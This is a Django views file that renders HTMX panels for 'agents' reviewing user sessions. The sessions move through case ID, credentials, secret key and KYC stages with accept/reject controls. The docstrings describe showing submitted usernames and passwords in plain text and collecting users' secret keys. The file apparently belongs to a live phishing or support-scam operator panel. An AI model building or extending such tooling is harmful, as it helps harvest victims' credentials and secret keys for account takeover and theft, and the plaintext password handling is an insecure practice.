# accounts/views/partial_views.py
"""
HTMX Partial Template Views

Handles partial HTML fragments for real-time updates via HTMX/WebSocket:
- Stage controls: Accept/reject buttons based on current stage
- Session stepper: Progress indicator
- Verified data: Display approved submissions
- Current submission: Display pending review data
"""

from django.shortcuts import render, get_object_or_404
from django.contrib.auth.decorators import login_required
from accounts.models import Session


@login_required
def get_stage_controls(request, uuid):
    """
    Return stage control buttons partial for AJAX/HTMX updates.

    This partial shows different buttons based on the current stage:
    - case_id: No controls (auto-advances)
    - credentials: Accept/Reject buttons
    - secret_key: Accept/Reject buttons
    - kyc: Accept/Reject buttons
    - completed: No controls

    Template: accounts/partials/_stage_controls.html
    """
    session = get_object_or_404(Session, uuid=uuid, agent=request.user)

    return render(request, 'accounts/partials/_stage_controls.html', {
        'session': session
    })


@login_required
def get_session_stepper(request, uuid):
    """
    Return session progress stepper partial for AJAX/HTMX updates.

    Shows progress through stages:
    - Case ID ✓
    - Credentials ► (current)
    - Secret Key
    - KYC
    - Completed

    Template: accounts/partials/_session_stepper.html
    """
    session = get_object_or_404(Session, uuid=uuid, agent=request.user)

    return render(request, 'accounts/partials/_session_stepper.html', {
        'session': session
    })


@login_required
def get_verified_data(request, uuid):
    """
    Return verified data panel partial for AJAX/HTMX updates.

    Shows all data that agent has already approved:
    - Verified credentials (username, password)
    - Verified secret key
    - Verified KYC status
    - Verification timestamps and who verified

    Template: accounts/partials/_verified_data.html
    """
    session = get_object_or_404(Session, uuid=uuid, agent=request.user)

    user_data = session.user_data or {}
    verified_data = user_data.get('verified_data', {})

    return render(request, 'accounts/partials/_verified_data.html', {
        'session': session,
        'verified_data': verified_data
    })


@login_required
def get_current_submission(request, uuid):
    """
    Return current submission panel partial for AJAX/HTMX updates.

    Shows data the user just submitted, waiting for agent review:
    - Pending credentials (username, password in plain text)
    - Pending secret key
    - Pending KYC status
    - Submission timestamp

    Template: accounts/partials/_current_submission.html
    """
    session = get_object_or_404(Session, uuid=uuid, agent=request.user)

    user_data = session.user_data or {}
    current_submission = user_data.get('current_submission', {})

    return render(request, 'accounts/partials/_current_submission.html', {
        'session': session,
        'current_submission': current_submission
    })
